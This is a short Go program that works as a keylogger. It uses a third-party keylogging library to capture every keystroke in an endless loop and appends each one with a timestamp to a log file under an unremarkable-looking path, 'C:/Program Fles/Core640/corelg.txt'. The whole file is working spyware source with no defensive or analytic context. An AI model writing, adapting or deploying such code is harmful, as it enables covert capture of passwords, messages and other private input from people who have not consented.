package main

import(
	keys"github.com/kindlyfire/go-keylogger"
	"time"
	"fmt"
	"os"
	"log"
	"strconv"
)

func check(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func strconverter(nb int) string {
	return(strconv.Itoa(nb)) 
}

func gettimestring() string{
	t := time.Now()
	return(strconverter(t.Year())+"/"+t.Month().String()+"/"+strconverter(t.Day())+"|"+strconverter(t.Hour())+":"+strconverter(t.Minute())+":"+strconverter(t.Second()))
}

func exist(name string) bool {
    if _, err := os.Stat(name); err != nil {
        if os.IsNotExist(err) {
            return false
        }
    }
    return true
}

func main() {
	if !exist("C:/Program Fles/Core640/corelg.txt") {
		_, err := os.Create("C:/Program Fles/Core640/corelg.txt")
		check(err)
	}
	kl := keys.NewKeylogger()	
	for {
		key := kl.GetKey()
		if !key.Empty {
			f, err2 := os.OpenFile("C:/Program Fles/Core640/corelg.txt", os.O_APPEND,0644)
			check(err2)
			f.WriteString(gettimestring()+"  :   "+string(key.Rune)+"\n")
		}
	}	
}
